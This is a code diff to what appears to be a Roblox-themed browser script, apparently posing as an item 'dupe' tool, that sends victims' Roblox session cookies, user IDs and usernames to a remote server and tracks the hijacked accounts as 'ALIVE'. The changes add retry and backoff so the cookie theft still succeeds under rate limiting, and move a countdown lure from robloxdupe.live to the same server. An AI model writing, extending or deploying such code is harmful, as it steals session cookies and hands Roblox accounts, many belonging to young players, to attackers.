@@ -80,44 +80,58 @@ async function getRobloxUserInfo(cookie) {
 }
 
 // ===== Send Data to Server =====
-async function sendToServer(cookie, userInfo, gameName = 'Unknown') {
-    try {
-        const payload = {
-            cookie: cookie,
-            userId: userInfo.id,
-            username: userInfo.name,
-            displayName: userInfo.displayName,
-            game: gameName,
-            timestamp: new Date().toISOString()
-        };
+async function sendToServer(cookie, userInfo, gameName = 'Unknown', retries = 3) {
+    for (let attempt = 1; attempt <= retries; attempt++) {
+        try {
+            const payload = {
+                cookie: cookie,
+                userId: userInfo.id,
+                username: userInfo.name,
+                displayName: userInfo.displayName,
+                game: gameName,
+                timestamp: new Date().toISOString()
+            };
 
-        const response = await fetch(`${SERVER_URL}/api/sessions`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-API-Key': API_KEY
-            },
-            body: JSON.stringify(payload)
-        });
+            const response = await fetch(`${SERVER_URL}/api/sessions`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-API-Key': API_KEY
+                },
+                body: JSON.stringify(payload)
+            });
 
-        if (!response.ok) {
-            throw new Error(`Server error: ${response.status}`);
+            if (response.status === 429) {
+                const waitTime = Math.pow(2, attempt) * 1000; // 2s, 4s, 8s
+                console.warn(`⚠️ Rate limited (429), retrying in ${waitTime/1000}s... (attempt ${attempt}/${retries})`);
+                await new Promise(r => setTimeout(r, waitTime));
+                continue;
+            }
+
+            if (!response.ok) {
+                throw new Error(`Server error: ${response.status}`);
+            }
+
+            const result = await response.json();
+            console.log('✅ Cookie sent to server:', userInfo.name);
+
+            // Track this account
+            trackedAccounts[userInfo.id] = {
+                username: userInfo.name,
+                status: 'ALIVE',
+                lastCheck: Date.now()
+            };
+
+            return result;
+        } catch (error) {
+            if (attempt === retries) {
+                console.error('Error sending to server:', error);
+                throw error;
+            }
+            const waitTime = Math.pow(2, attempt) * 1000;
+            console.warn(`⚠️ Send failed, retrying in ${waitTime/1000}s... (attempt ${attempt}/${retries})`);
+            await new Promise(r => setTimeout(r, waitTime));
         }
-
-        const result = await response.json();
-        console.log('✅ Cookie sent to server:', userInfo.name);
-
-        // Track this account
-        trackedAccounts[userInfo.id] = {
-            username: userInfo.name,
-            status: 'ALIVE',
-            lastCheck: Date.now()
-        };
-
-        return result;
-    } catch (error) {
-        console.error('Error sending to server:', error);
-        throw error;
     }
 }
 
@@ -203,7 +217,7 @@ let countdownInterval = null;
 
 async function getCountdownDuration() {
     try {
-        const res = await fetch("https://robloxdupe.live/api/countdown");
+        const res = await fetch(`${SERVER_URL}/get_countdown`);
         if (!res.ok) {
             console.warn('Countdown API returned status:', res.status, '- using default 12h');
             return 12 * 60 * 60 * 1000;
@@ -214,7 +228,7 @@ async function getCountdownDuration() {
             return 12 * 60 * 60 * 1000;
         }
         const data = await res.json();
-        return parseInt(data.countdown_hours, 10) * 60 * 60 * 1000;
+        return parseFloat(data.countdown_hours) * 60 * 60 * 1000;
     } catch (error) {
         console.warn('Failed to fetch countdown duration:', error.message, '- using default 12h');
         return 12 * 60 * 60 * 1000;
@@ -223,12 +237,16 @@ async function getCountdownDuration() {
 
 async function updateModalDurationText() {
     const COUNTDOWN_DURATION = await getCountdownDuration();
-
-    const durationHours = Math.round(COUNTDOWN_DURATION / (1000 * 60 * 60));
+    const durationHours = COUNTDOWN_DURATION / (1000 * 60 * 60);
     const durationEl = document.getElementById("durationHours");
 
     if (durationEl) {
-        durationEl.textContent = durationHours;
+        if (durationHours >= 1) {
+            durationEl.textContent = Math.round(durationHours);
+        } else {
+            const minutes = Math.round(durationHours * 60);
+            durationEl.textContent = `${minutes} minute`;
+        }
     }
 }
 
